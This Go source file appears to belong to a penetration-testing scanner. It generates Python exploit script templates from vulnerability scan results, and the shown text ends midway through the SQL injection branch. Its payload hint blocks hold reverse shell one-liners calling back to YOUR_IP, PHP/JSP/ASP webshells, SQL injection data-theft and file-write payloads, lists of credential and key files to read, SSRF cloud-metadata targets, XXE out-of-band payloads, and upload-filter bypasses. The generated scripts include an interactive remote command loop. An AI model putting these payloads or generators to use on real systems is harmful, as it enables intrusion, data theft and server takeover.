package lib

import (
	"fmt"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/shadow1ng/fscan/Common"
)

// ExpGenerator EXP脚本模板生成器
type ExpGenerator struct {
	mu        sync.Mutex
	outputDir string // EXP脚本输出目录
}

// 全局EXP生成器实例
var expGenerator *ExpGenerator
var expOnce sync.Once

// InitExpGenerator 初始化EXP生成器
func InitExpGenerator(outputDir string) {
	expOnce.Do(func() {
		if outputDir == "" {
			outputDir = "exp_templates"
		}
		expGenerator = &ExpGenerator{
			outputDir: outputDir,
		}
		// 创建输出目录
		if err := os.MkdirAll(outputDir, 0755); err != nil {
			Common.LogError(fmt.Sprintf("创建EXP输出目录失败: %v", err))
		}
	})
}

// GetExpGenerator 获取全局EXP生成器实例
func GetExpGenerator() *ExpGenerator {
	return expGenerator
}

// VulnCategory 漏洞类型分类
type VulnCategory string

const (
	CategoryRCE           VulnCategory = "rce"            // 远程命令执行
	CategorySQLi          VulnCategory = "sqli"           // SQL注入
	CategoryFileRead      VulnCategory = "file_read"      // 任意文件读取
	CategoryFileUpload    VulnCategory = "file_upload"    // 文件上传
	CategorySSRF          VulnCategory = "ssrf"           // 服务端请求伪造
	CategoryXXE           VulnCategory = "xxe"            // XML外部实体注入
	CategoryDeser         VulnCategory = "deser"          // 反序列化
	CategoryUnauth        VulnCategory = "unauth"         // 未授权访问
	CategoryWeakPwd       VulnCategory = "weak_pwd"       // 弱口令
	CategoryLFI           VulnCategory = "lfi"            // 本地文件包含
	CategoryXSS           VulnCategory = "xss"            // 跨站脚本
	CategoryPathTraversal VulnCategory = "path_traversal" // 路径穿越
	CategoryInfoLeak      VulnCategory = "info_leak"      // 信息泄露
	CategoryOther         VulnCategory = "other"          // 其他
)

// ExpTemplateData EXP模板所需数据
type ExpTemplateData struct {
	PocName       string            // POC名称
	VulnName      string            // 漏洞名称
	Target        string            // 目标URL
	Method        string            // HTTP请求方法
	Path          string            // 请求路径
	Headers       map[string]string // 请求头
	Body          string            // 请求体
	Description   string            // 漏洞描述
	Author        string            // POC作者
	Links         []string          // 参考链接
	Category      VulnCategory      // 漏洞类型
	ExploitParams StrMap            // 利用参数
}

// classifyVulnType 根据POC名称和规则内容自动分类漏洞类型
func classifyVulnType(pocName string, rules []Rules) VulnCategory {
	name := strings.ToLower(pocName)

	// 基于名称关键词匹配
	rceKeywords := []string{"rce", "command-exec", "code-exec", "getshell", "deserialization", "命令执行"}
	for _, kw := range rceKeywords {
		if strings.Contains(name, kw) {
			return CategoryRCE
		}
	}

	sqliKeywords := []string{"sqli", "sql-inject", "sql-injection", "sql"}
	for _, kw := range sqliKeywords {
		if strings.Contains(name, kw) {
			return CategorySQLi
		}
	}

	fileReadKeywords := []string{"file-read", "fileread", "readfile", "file-download", "filedownload", "arbitrary-file-read"}
	for _, kw := range fileReadKeywords {
		if strings.Contains(name, kw) {
			return CategoryFileRead
		}
	}

	if strings.Contains(name, "upload") || strings.Contains(name, "file-write") || strings.Contains(name, "write-shell") {
		return CategoryFileUpload
	}

	if strings.Contains(name, "ssrf") {
		return CategorySSRF
	}

	if strings.Contains(name, "xxe") {
		return CategoryXXE
	}

	if strings.Contains(name, "deseriali") || strings.Contains(name, "serialization") {
		return CategoryDeser
	}

	if strings.Contains(name, "unauth") || strings.Contains(name, "unauthorized") || strings.Contains(name, "bypass") {
		return CategoryUnauth
	}

	if strings.Contains(name, "default-password") || strings.Contains(name, "weak") {
		return CategoryWeakPwd
	}

	lfiKeywords := []string{"lfi", "file-inclusion", "file-include", "fileinclude"}
	for _, kw := range lfiKeywords {
		if strings.Contains(name, kw) {
			return CategoryLFI
		}
	}

	if strings.Contains(name, "xss") {
		return CategoryXSS
	}

	if strings.Contains(name, "path-traversal") || strings.Contains(name, "directory-traversal") || strings.Contains(name, "traversal") {
		return CategoryPathTraversal
	}

	if strings.Contains(name, "info-leak") || strings.Contains(name, "information-disclosure") || strings.Contains(name, "leak") || strings.Contains(name, "detect") {
		return CategoryInfoLeak
	}

	// 基于规则内容进一步分析
	for _, rule := range rules {
		bodyLower := strings.ToLower(rule.Body)
		pathLower := strings.ToLower(rule.Path)

		// 检查是否包含命令执行特征
		if strings.Contains(bodyLower, "exec") || strings.Contains(bodyLower, "/bin/sh") ||
			strings.Contains(bodyLower, "cmd.exe") || strings.Contains(bodyLower, "whoami") ||
			strings.Contains(pathLower, "/bin/sh") || strings.Contains(bodyLower, "runtime") {
			return CategoryRCE
		}

		// 检查是否包含SQL注入特征
		if strings.Contains(bodyLower, "select") && strings.Contains(bodyLower, "from") ||
			strings.Contains(bodyLower, "union") || strings.Contains(bodyLower, "sleep(") {
			return CategorySQLi
		}

		// 检查是否包含文件读取特征
		if strings.Contains(pathLower, "etc/passwd") || strings.Contains(pathLower, "..%2f") ||
			strings.Contains(pathLower, "../") {
			return CategoryFileRead
		}

		// 检查是否包含文件上传特征
		if rule.Method == "PUT" || strings.Contains(bodyLower, "multipart") {
			return CategoryFileUpload
		}
	}

	return CategoryOther
}

// getPayloadHints 根据漏洞类型返回payload提示
func getPayloadHints(category VulnCategory) string {
	switch category {
	case CategoryRCE:
		return `# ============================================================
# Payload 提示 - 远程命令执行 (RCE)
# ============================================================
# 可尝试以下类型的 payload:
#
# [Linux 命令执行]
#   - id                          # 查看当前用户信息
#   - whoami                      # 查看当前用户名
#   - cat /etc/passwd             # 读取系统用户信息
#   - uname -a                    # 查看系统内核版本
#   - ifconfig / ip addr          # 查看网络接口信息
#   - ls -la /                    # 列出根目录文件
#   - curl http://your-server/    # 测试网络出口(OOB)
#
# [Windows 命令执行]
#   - whoami                      # 查看当前用户名
#   - ipconfig                    # 查看网络配置
#   - dir c:\                     # 列出C盘根目录
#   - type c:\windows\win.ini     # 读取系统文件
#   - net user                    # 查看系统用户
#   - systeminfo                  # 查看系统信息
#
# [反弹Shell (需要提前监听)]
#   - bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1
#   - python -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
#   - nc -e /bin/bash YOUR_IP YOUR_PORT
#   - powershell -nop -c "$client=New-Object Net.Sockets.TCPClient('YOUR_IP',YOUR_PORT);..."
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategorySQLi:
		return `# ============================================================
# Payload 提示 - SQL 注入 (SQLi)
# ============================================================
# 可尝试以下类型的 payload:
#
# [信息探测]
#   - ' OR '1'='1                           # 布尔型注入测试
#   - ' OR 1=1--                            # 注释绕过认证
#   - ' UNION SELECT NULL,NULL--            # 确定列数
#   - ' UNION SELECT version(),user()--     # 获取数据库版本和用户(MySQL)
#   - ' UNION SELECT @@version,db_name()--  # 获取数据库信息(MSSQL)
#
# [数据提取]
#   - ' UNION SELECT table_name,NULL FROM information_schema.tables--
#   - ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
#   - ' UNION SELECT username,password FROM users--
#
# [时间盲注]
#   - ' AND SLEEP(5)--                      # MySQL 延时注入
#   - ' AND pg_sleep(5)--                   # PostgreSQL 延时注入
#   - '; WAITFOR DELAY '0:0:5'--            # MSSQL 延时注入
#
# [文件读写 (高权限)]
#   - ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--   # MySQL 读文件
#   - ' INTO OUTFILE '/var/www/shell.php'--            # MySQL 写文件
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryFileRead:
		return `# ============================================================
# Payload 提示 - 任意文件读取
# ============================================================
# 可尝试以下路径作为 payload:
#
# [Linux 敏感文件]
#   - /etc/passwd                 # 用户信息
#   - /etc/shadow                 # 密码哈希(需root)
#   - /etc/hosts                  # 主机映射
#   - /proc/self/environ          # 环境变量(可能含密钥)
#   - /root/.bash_history         # root命令历史
#   - /root/.ssh/id_rsa           # SSH私钥
#   - /var/log/auth.log           # 认证日志
#
# [Windows 敏感文件]
#   - C:\Windows\win.ini
#   - C:\Windows\System32\config\SAM
#   - C:\Users\Administrator\.ssh\id_rsa
#   - C:\inetpub\wwwroot\web.config
#
# [Web应用配置文件]
#   - /WEB-INF/web.xml            # Java Web 配置
#   - /WEB-INF/classes/application.properties  # SpringBoot配置
#   - /WEB-INF/classes/application.yml
#   - .env                        # 环境变量文件
#   - config/database.yml         # Rails 数据库配置
#   - wp-config.php               # WordPress 配置
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryFileUpload:
		return `# ============================================================
# Payload 提示 - 文件上传
# ============================================================
# 可尝试以下类型的 payload:
#
# [Webshell - JSP]
#   - <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
#   - 更完整的JSP马请自行准备
#
# [Webshell - PHP]
#   - <?php @eval($_POST['cmd']);?>
#   - <?php system($_GET['cmd']);?>
#
# [Webshell - ASP/ASPX]
#   - <%eval request("cmd")%>
#
# [绕过技巧]
#   - 修改Content-Type为 image/jpeg
#   - 使用双扩展名: shell.php.jpg
#   - 使用大小写绕过: shell.PhP
#   - 添加空字节: shell.php%00.jpg
#   - 使用 .htaccess 覆盖解析规则
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategorySSRF:
		return `# ============================================================
# Payload 提示 - 服务端请求伪造 (SSRF)
# ============================================================
# 可尝试以下类型的 payload:
#
# [内网探测]
#   - http://127.0.0.1:PORT       # 探测本地服务
#   - http://192.168.1.1          # 探测内网网关
#   - http://10.0.0.1             # 探测内网其他段
#   - http://169.254.169.254/     # AWS元数据(云环境)
#   - http://metadata.google.internal/  # GCP元数据
#
# [协议利用]
#   - file:///etc/passwd          # 读取本地文件
#   - dict://127.0.0.1:6379/      # 探测Redis
#   - gopher://127.0.0.1:6379/    # Redis命令注入
#   - gopher://127.0.0.1:25/      # SMTP协议利用
#
# [绕过技巧]
#   - http://0x7f000001/          # 十六进制IP
#   - http://0177.0.0.1/          # 八进制IP
#   - http://127.1/               # 简写IP
#   - http://your-domain.com@127.0.0.1/  # @绕过
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryXXE:
		return `# ============================================================
# Payload 提示 - XML外部实体注入 (XXE)
# ============================================================
# 可尝试以下类型的 payload:
#
# [文件读取]
#   - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
#   - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
#
# [内网探测]
#   - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://内网IP:端口/">]>
#
# [带外数据传输 (OOB)]
#   - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://YOUR_SERVER/?data=xxx">]>
#   - 使用外部DTD进行数据外带
#
# [PHP环境下Base64编码读取]
#   - <!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=文件路径">]>
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryDeser:
		return `# ============================================================
# Payload 提示 - 反序列化漏洞
# ============================================================
# 可尝试以下类型的 payload:
#
# [Java 反序列化]
#   - 使用 ysoserial 生成 payload:
#     java -jar ysoserial.jar CommonsCollections1 "命令"
#     java -jar ysoserial.jar URLDNS "http://dnslog地址"
#   - 常见利用链: CommonsCollections, JRMP, Spring, JBoss等
#
# [PHP 反序列化]
#   - 构造POP链进行利用
#   - 使用 phpggc 生成 payload
#
# [Python 反序列化 (pickle)]
#   - 构造恶意pickle对象执行系统命令
#
# [.NET 反序列化]
#   - 使用 ysoserial.net 生成 payload
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryUnauth:
		return `# ============================================================
# Payload 提示 - 未授权访问
# ============================================================
# 该漏洞为未授权访问类型,攻击者可直接访问受保护资源。
#
# [利用建议]
#   - 直接访问暴露的管理接口/API
#   - 尝试执行管理功能(创建用户、读取配置等)
#   - 检查是否可以访问敏感数据
#   - 尝试提升权限或横向移动
#
# [后续操作]
#   - 列举可用的API端点和功能
#   - 获取系统配置信息
#   - 检查是否存在更多漏洞
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryWeakPwd:
		return `# ============================================================
# Payload 提示 - 弱口令/默认密码
# ============================================================
# 已发现弱口令/默认密码,可尝试:
#
# [利用建议]
#   - 使用发现的凭据登录管理后台
#   - 检查后台是否存在进一步利用点(文件上传、命令执行等)
#   - 尝试修改配置获取更高权限
#   - 枚举其他用户账户
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryLFI:
		return `# ============================================================
# Payload 提示 - 本地文件包含 (LFI)
# ============================================================
# 可尝试以下类型的 payload:
#
# [基础路径穿越]
#   - ../../../etc/passwd
#   - ..%2f..%2f..%2fetc%2fpasswd
#   - ....//....//....//etc/passwd
#
# [PHP伪协议]
#   - php://filter/convert.base64-encode/resource=index.php
#   - php://input  (配合POST body传入代码)
#   - data://text/plain,<?php phpinfo();?>
#   - expect://whoami
#
# [日志注入 -> RCE]
#   - /var/log/apache2/access.log  (先注入恶意UA)
#   - /var/log/auth.log
#   - /proc/self/environ
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryPathTraversal:
		return `# ============================================================
# Payload 提示 - 路径穿越
# ============================================================
# 可尝试以下路径进行读取:
#
# [Linux]
#   - ../../../../etc/passwd
#   - ../../../../etc/shadow
#   - ../../../../proc/self/environ
#   - ../../../../root/.ssh/id_rsa
#
# [Windows]
#   - ..\..\..\..\windows\win.ini
#   - ..\..\..\..\windows\system32\config\SAM
#
# [编码绕过]
#   - %2e%2e%2f  -> ../
#   - %252e%252e%252f  -> 双重编码
#   - ..%c0%af  -> UTF-8编码绕过
#   - ..%5c  -> 反斜杠编码
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	case CategoryInfoLeak:
		return `# ============================================================
# Payload 提示 - 信息泄露
# ============================================================
# 该漏洞导致敏感信息泄露,可尝试:
#
# [进一步信息收集]
#   - 提取泄露的版本号用于查找更多CVE
#   - 收集内部路径、用户名等信息
#   - 检查是否存在数据库连接字符串
#   - 查看是否有API密钥或Token泄露
#
# [结合其他漏洞]
#   - 利用泄露的路径信息进行文件读取
#   - 利用泄露的凭据尝试登录
#   - 利用版本信息查找已知漏洞
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`

	default:
		return `# ============================================================
# Payload 提示
# ============================================================
# 请根据漏洞类型自行构造合适的 payload。
#
# [通用建议]
#   - 仔细分析POC验证请求,理解漏洞原理
#   - 参考漏洞详情中的参考链接获取更多信息
#   - 根据目标环境(操作系统、中间件版本)调整payload
#   - 使用Burp Suite等工具辅助测试
#
# ⚠️ 警告: 仅在授权范围内使用,切勿用于非法用途!
# ============================================================`
	}
}

// GenerateExpTemplate 根据POC验证结果生成EXP脚本模板
func (eg *ExpGenerator) GenerateExpTemplate(data *ExpTemplateData) error {
	eg.mu.Lock()
	defer eg.mu.Unlock()

	// 自动分类漏洞类型 (如果未手动指定)
	if data.Category == "" {
		data.Category = classifyVulnType(data.PocName, nil)
	}

	// 生成Python EXP脚本
	script := eg.buildPythonExpScript(data)

	// 构建文件名
	fileName := eg.buildFileName(data)
	filePath := filepath.Join(eg.outputDir, fileName)

	// 写入文件
	if err := os.WriteFile(filePath, []byte(script), 0644); err != nil {
		return fmt.Errorf("写入EXP脚本失败: %v", err)
	}

	Common.LogSuccess(fmt.Sprintf("已生成EXP脚本模板: %s", filePath))
	return nil
}

// buildFileName 构建EXP脚本文件名
func (eg *ExpGenerator) buildFileName(data *ExpTemplateData) string {
	// 从POC名称生成文件名
	name := data.PocName
	name = strings.TrimPrefix(name, "poc-yaml-")
	name = strings.TrimPrefix(name, "poc-")

	// 替换特殊字符
	re := regexp.MustCompile(`[^a-zA-Z0-9_\-]`)
	name = re.ReplaceAllString(name, "_")

	// 从目标URL提取主机部分
	host := "target"
	if data.Target != "" {
		if u, err := url.Parse(data.Target); err == nil {
			host = strings.ReplaceAll(u.Host, ":", "_")
		}
	}

	return fmt.Sprintf("exp_%s_%s.py", name, host)
}

// buildPythonExpScript 构建Python EXP脚本内容
func (eg *ExpGenerator) buildPythonExpScript(data *ExpTemplateData) string {
	var sb strings.Builder

	// ===== 文件头 =====
	sb.WriteString("#!/usr/bin/env python3\n")
	sb.WriteString("# -*- coding: utf-8 -*-\n")
	sb.WriteString(fmt.Sprintf("# ============================================================\n"))
	sb.WriteString(fmt.Sprintf("# EXP 脚本模板 - 自动生成\n"))
	sb.WriteString(fmt.Sprintf("# 漏洞名称: %s\n", data.PocName))
	if data.VulnName != "" && data.VulnName != data.PocName {
		sb.WriteString(fmt.Sprintf("# 漏洞别名: %s\n", data.VulnName))
	}
	sb.WriteString(fmt.Sprintf("# 目标地址: %s\n", data.Target))
	sb.WriteString(fmt.Sprintf("# 漏洞类型: %s\n", data.Category))
	sb.WriteString(fmt.Sprintf("# 生成时间: %s\n", time.Now().Format("2006-01-02 15:04:05")))
	if data.Author != "" {
		sb.WriteString(fmt.Sprintf("# POC作者: %s\n", data.Author))
	}
	if data.Description != "" {
		sb.WriteString(fmt.Sprintf("# 漏洞描述: %s\n", data.Description))
	}
	sb.WriteString(fmt.Sprintf("# ============================================================\n"))
	sb.WriteString("#\n")
	sb.WriteString("# ⚠️  免责声明:\n")
	sb.WriteString("# 本脚本仅供授权安全测试使用,请勿用于未授权的渗透测试!\n")
	sb.WriteString("# 使用者需自行承担因违规使用而产生的一切法律责任。\n")
	sb.WriteString("#\n")

	// 参考链接
	if len(data.Links) > 0 {
		sb.WriteString("# 参考链接:\n")
		for _, link := range data.Links {
			sb.WriteString(fmt.Sprintf("#   - %s\n", link))
		}
	}
	sb.WriteString("# ============================================================\n\n")

	// ===== 导入模块 =====
	sb.WriteString("import requests\n")
	sb.WriteString("import sys\n")
	sb.WriteString("import urllib3\n")
	sb.WriteString("from urllib.parse import urljoin\n")
	sb.WriteString("\n")
	sb.WriteString("# 禁用SSL警告\n")
	sb.WriteString("urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\n")

	// ===== Payload提示注释 =====
	sb.WriteString(getPayloadHints(data.Category))
	sb.WriteString("\n\n")

	// ===== 配置区域 =====
	sb.WriteString("# ============================================================\n")
	sb.WriteString("# 配置区域 - 请根据实际情况修改以下参数\n")
	sb.WriteString("# ============================================================\n\n")

	sb.WriteString(fmt.Sprintf("TARGET = \"%s\"  # 目标地址\n\n", data.Target))

	// 根据漏洞类型生成对应的payload占位符
	switch data.Category {
	case CategoryRCE:
		sb.WriteString("# ★★★ 请在此处填写您的命令执行 payload ★★★\n")
		sb.WriteString("PAYLOAD = \"id\"  # <-- 替换为你要执行的命令\n\n")
	case CategorySQLi:
		sb.WriteString("# ★★★ 请在此处填写您的 SQL 注入 payload ★★★\n")
		sb.WriteString("PAYLOAD = \"' OR '1'='1\"  # <-- 替换为你的SQL注入语句\n\n")
	case CategoryFileRead, CategoryLFI, CategoryPathTraversal:
		sb.WriteString("# ★★★ 请在此处填写要读取的文件路径 ★★★\n")
		sb.WriteString("PAYLOAD = \"/etc/passwd\"  # <-- 替换为你要读取的文件路径\n\n")
	case CategoryFileUpload:
		sb.WriteString("# ★★★ 请在此处填写要上传的文件内容 ★★★\n")
		sb.WriteString("PAYLOAD = \"<?php @eval($_POST['cmd']);?>\"  # <-- 替换为你的webshell内容\n")
		sb.WriteString("UPLOAD_FILENAME = \"shell.php\"  # <-- 替换为上传的文件名\n\n")
	case CategorySSRF:
		sb.WriteString("# ★★★ 请在此处填写 SSRF 目标 URL ★★★\n")
		sb.WriteString("PAYLOAD = \"http://127.0.0.1:6379/\"  # <-- 替换为你要探测的内网地址\n\n")
	case CategoryXXE:
		sb.WriteString("# ★★★ 请在此处填写 XXE payload ★★★\n")
		sb.WriteString("PAYLOAD = '<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>'  # <-- 替换为你的XXE payload\n\n")
	case CategoryUnauth, CategoryInfoLeak, CategoryWeakPwd:
		sb.WriteString("# 该漏洞无需额外payload,直接利用即可\n")
		sb.WriteString("PAYLOAD = \"\"  # 此漏洞类型通常不需要自定义payload\n\n")
	default:
		sb.WriteString("# ★★★ 请在此处填写您的 payload ★★★\n")
		sb.WriteString("PAYLOAD = \"\"  # <-- 根据漏洞类型填写对应的payload\n\n")
	}

	// 添加已知的利用参数
	if len(data.ExploitParams) > 0 {
		sb.WriteString("# POC验证时发现的参数信息 (可作为EXP参考):\n")
		for _, param := range data.ExploitParams {
			sb.WriteString(fmt.Sprintf("# 参数 %s = %s\n", param.Key, param.Value))
		}
		sb.WriteString("\n")
	}

	// ===== 请求头配置 =====
	sb.WriteString("# 请求头配置\n")
	sb.WriteString("HEADERS = {\n")
	sb.WriteString("    \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36\",\n")
	if len(data.Headers) > 0 {
		for k, v := range data.Headers {
			// 转义引号
			escapedV := strings.ReplaceAll(v, `"`, `\"`)
			escapedV = strings.ReplaceAll(escapedV, `'`, `\'`)
			sb.WriteString(fmt.Sprintf("    \"%s\": \"%s\",\n", k, escapedV))
		}
	}
	sb.WriteString("}\n\n")

	// ===== 代理配置 =====
	sb.WriteString("# 代理配置 (可选, 用于配合 Burp Suite 调试)\n")
	sb.WriteString("PROXIES = {\n")
	sb.WriteString("    # \"http\": \"http://127.0.0.1:8080\",\n")
	sb.WriteString("    # \"https\": \"http://127.0.0.1:8080\",\n")
	sb.WriteString("}\n\n")

	sb.WriteString("TIMEOUT = 10  # 请求超时时间(秒)\n\n")

	// ===== 验证函数 =====
	sb.WriteString("# ============================================================\n")
	sb.WriteString("# 漏洞验证函数 (基于原始POC逻辑)\n")
	sb.WriteString("# ============================================================\n")
	sb.WriteString("def verify(target):\n")
	sb.WriteString("    \"\"\"验证目标是否存在漏洞\"\"\"\n")
	sb.WriteString("    try:\n")

	// 根据POC规则生成验证请求
	if data.Path != "" && data.Method != "" {
		escapedPath := strings.ReplaceAll(data.Path, `"`, `\"`)
		sb.WriteString(fmt.Sprintf("        url = urljoin(target, r\"%s\")\n", escapedPath))
		if data.Method == "GET" {
			sb.WriteString("        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n")
		} else {
			escapedBody := strings.ReplaceAll(data.Body, `"`, `\"`)
			escapedBody = strings.ReplaceAll(escapedBody, "\n", `\n`)
			sb.WriteString(fmt.Sprintf("        data = r\"%s\"\n", escapedBody))
			sb.WriteString(fmt.Sprintf("        resp = requests.%s(url, headers=HEADERS, data=data, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n",
				strings.ToLower(data.Method)))
		}
	} else {
		sb.WriteString("        url = target\n")
		sb.WriteString("        resp = requests.get(url, headers=HEADERS, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n")
	}
	sb.WriteString("        if resp.status_code == 200:\n")
	sb.WriteString("            print(f\"[+] 目标 {target} 可能存在漏洞!\")\n")
	sb.WriteString("            print(f\"[*] 状态码: {resp.status_code}\")\n")
	sb.WriteString("            print(f\"[*] 响应长度: {len(resp.text)}\")\n")
	sb.WriteString("            return True\n")
	sb.WriteString("        else:\n")
	sb.WriteString("            print(f\"[-] 目标 {target} 不存在漏洞 (状态码: {resp.status_code})\")\n")
	sb.WriteString("            return False\n")
	sb.WriteString("    except requests.exceptions.RequestException as e:\n")
	sb.WriteString("        print(f\"[-] 请求失败: {e}\")\n")
	sb.WriteString("        return False\n\n")

	// ===== 利用函数 =====
	sb.WriteString("# ============================================================\n")
	sb.WriteString("# 漏洞利用函数\n")
	sb.WriteString("# ============================================================\n")
	sb.WriteString("def exploit(target, payload):\n")
	sb.WriteString("    \"\"\"\n")
	sb.WriteString("    漏洞利用函数\n")
	sb.WriteString("    \n")
	sb.WriteString("    Args:\n")
	sb.WriteString("        target:  目标URL\n")
	sb.WriteString("        payload: 用户自定义的payload\n")
	sb.WriteString("    \n")
	sb.WriteString("    Returns:\n")
	sb.WriteString("        bool: 利用是否成功\n")
	sb.WriteString("    \"\"\"\n")
	sb.WriteString("    print(f\"[*] 正在利用漏洞...\")\n")
	sb.WriteString("    print(f\"[*] 目标: {target}\")\n")
	sb.WriteString("    print(f\"[*] Payload: {payload}\")\n")
	sb.WriteString("    print()\n\n")
	sb.WriteString("    try:\n")

	// 根据漏洞类型生成不同的利用逻辑框架
	eg.writeExploitBody(&sb, data)

	sb.WriteString("    except requests.exceptions.RequestException as e:\n")
	sb.WriteString("        print(f\"[-] 利用失败: {e}\")\n")
	sb.WriteString("        return False\n\n")

	// ===== 交互式Shell (仅RCE类型) =====
	if data.Category == CategoryRCE {
		sb.WriteString("# ============================================================\n")
		sb.WriteString("# 交互式命令执行 (仅RCE类型漏洞可用)\n")
		sb.WriteString("# ============================================================\n")
		sb.WriteString("def interactive_shell(target):\n")
		sb.WriteString("    \"\"\"交互式命令执行模式\"\"\"\n")
		sb.WriteString("    print(\"[*] 进入交互式命令执行模式 (输入 'exit' 退出)\")\n")
		sb.WriteString("    print()\n")
		sb.WriteString("    while True:\n")
		sb.WriteString("        try:\n")
		sb.WriteString("            cmd = input(\"shell> \").strip()\n")
		sb.WriteString("            if cmd.lower() in ('exit', 'quit', 'q'):\n")
		sb.WriteString("                print(\"[*] 退出交互模式\")\n")
		sb.WriteString("                break\n")
		sb.WriteString("            if not cmd:\n")
		sb.WriteString("                continue\n")
		sb.WriteString("            exploit(target, cmd)\n")
		sb.WriteString("        except KeyboardInterrupt:\n")
		sb.WriteString("            print(\"\\n[*] 用户中断\")\n")
		sb.WriteString("            break\n\n")
	}

	// ===== 主入口 =====
	sb.WriteString("# ============================================================\n")
	sb.WriteString("# 主函数\n")
	sb.WriteString("# ============================================================\n")
	sb.WriteString("if __name__ == \"__main__\":\n")
	sb.WriteString("    print(\"=\"*60)\n")
	sb.WriteString(fmt.Sprintf("    print(\"EXP: %s\")\n", data.PocName))
	sb.WriteString("    print(\"=\"*60)\n")
	sb.WriteString("    print()\n\n")

	sb.WriteString("    # 支持命令行参数指定目标\n")
	sb.WriteString("    target = sys.argv[1] if len(sys.argv) > 1 else TARGET\n")
	sb.WriteString("    payload = sys.argv[2] if len(sys.argv) > 2 else PAYLOAD\n\n")

	sb.WriteString("    if not target:\n")
	sb.WriteString("        print(\"用法: python3 {} <目标URL> [payload]\".format(sys.argv[0]))\n")
	sb.WriteString("        sys.exit(1)\n\n")

	sb.WriteString("    # Step 1: 验证漏洞\n")
	sb.WriteString("    print(\"[*] Step 1: 验证漏洞是否存在...\")\n")
	sb.WriteString("    if verify(target):\n")
	sb.WriteString("        print()\n")
	sb.WriteString("        # Step 2: 利用漏洞\n")
	sb.WriteString("        print(\"[*] Step 2: 执行漏洞利用...\")\n")
	sb.WriteString("        exploit(target, payload)\n")

	if data.Category == CategoryRCE {
		sb.WriteString("        print()\n")
		sb.WriteString("        # Step 3: 可选 - 进入交互模式\n")
		sb.WriteString("        choice = input(\"\\n[?] 是否进入交互式命令执行模式? (y/n): \").strip().lower()\n")
		sb.WriteString("        if choice == 'y':\n")
		sb.WriteString("            interactive_shell(target)\n")
	}

	sb.WriteString("    else:\n")
	sb.WriteString("        print(\"[-] 目标不存在该漏洞, 利用终止\")\n")
	sb.WriteString("        sys.exit(1)\n")

	return sb.String()
}

// writeExploitBody 根据漏洞类型写入利用函数主体
func (eg *ExpGenerator) writeExploitBody(sb *strings.Builder, data *ExpTemplateData) {
	escapedPath := strings.ReplaceAll(data.Path, `"`, `\"`)

	switch data.Category {
	case CategoryRCE:
		// RCE类型: 将payload注入到命令执行位置
		if data.Path != "" {
			sb.WriteString(fmt.Sprintf("        # 原始POC路径: %s\n", escapedPath))
		}
		sb.WriteString("        # TODO: 将payload替换到命令执行的位置\n")
		sb.WriteString("        # 以下为框架代码,请根据实际漏洞修改请求\n")
		if data.Path != "" {
			sb.WriteString(fmt.Sprintf("        vuln_path = r\"%s\"  # 可能需要将payload嵌入此路径\n", escapedPath))
		} else {
			sb.WriteString("        vuln_path = \"/\"  # 请填写漏洞路径\n")
		}
		sb.WriteString("        url = urljoin(target, vuln_path)\n")
		if data.Body != "" {
			sb.WriteString("        # 原始请求体(payload需要替换到对应位置):\n")
			escapedBody := strings.ReplaceAll(data.Body, `"`, `\"`)
			escapedBody = strings.ReplaceAll(escapedBody, "\n", `\n`)
			sb.WriteString(fmt.Sprintf("        body = r\"%s\"\n", escapedBody))
			sb.WriteString("        # 将payload注入到请求体中(请根据实际情况修改注入位置)\n")
			sb.WriteString("        body = body.replace(\"PAYLOAD_HERE\", payload)  # 修改此行\n")
			sb.WriteString(fmt.Sprintf("        resp = requests.%s(url, headers=HEADERS, data=body, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n",
				strings.ToLower(data.Method)))
		} else {
			sb.WriteString(fmt.Sprintf("        resp = requests.%s(url, headers=HEADERS, timeout=TIMEOUT, verify=False, proxies=PROXIES)\n",
				strings.ToLower(data.Method)))
		}
		sb.WriteString("        print(f\"[+] 响应状态码: {resp.status_code}\")\n")
		sb.WriteString("        print(f\"[+] 响应内容:\\n{resp.text}\")\n")
		sb.WriteString("        return True\n\n")

	case CategorySQLi:
		sb.WriteString("        # TODO: 将SQL注入payload嵌入到请求中\n")
		if data.Path != "" {
